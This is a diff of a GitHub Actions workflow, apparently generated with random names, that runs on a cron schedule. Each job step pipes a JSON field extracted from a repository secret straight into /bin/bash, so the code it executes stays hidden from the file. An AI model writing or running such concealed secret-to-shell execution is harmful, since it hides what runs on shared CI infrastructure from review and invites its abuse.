@@ -2,8 +2,8 @@ name: taofeiji3489
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
-jobs:  # 16009
+    - cron: '33 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +11,14 @@ jobs:  # 16009
       - uses: actions/checkout@v4
       - name: taofeiji3489
         env:
-          psf7: ${{ secrets.psf7 }}
+          xzil2019: ${{ secrets.xzil2019 }}
         run: |
-          echo $psf7 | jq -r .xut307 | /bin/bash
-          echo $zdozh51 | jq -r .nuog550 | /bin/bash
-          echo $qvbf8 | jq -r .sg89888 | /bin/bash
-          echo $tgiiv21096 | jq -r .egv4487 | /bin/bash
-          echo $z245 | jq -r .sd85 | /bin/bash
-          echo $vbcq719 | jq -r .mkm61415 | /bin/bash
-          echo $ore301 | jq -r .aemg253 | /bin/bash
-          echo $tl38 | jq -r .q4 | /bin/bash
-          echo $vo252 | jq -r .nhwmq5198 | /bin/bash
-          echo $qx68 | jq -r .l06 | /bin/bash
+          echo $xzil2019 | jq -r .ocv2 | /bin/bash
+          echo $ya43079 | jq -r .k78361 | /bin/bash
+          echo $wirku92950 | jq -r .xpne227 | /bin/bash
+          echo $gwo204 | jq -r .jsbl76 | /bin/bash
+          echo $swt3594 | jq -r .oax938 | /bin/bash
+          echo $wpde86591 | jq -r .la2 | /bin/bash
+          echo $sr989 | jq -r .mmoh70943 | /bin/bash
+          echo $pjfsq61 | jq -r .tdvs2000 | /bin/bash
 
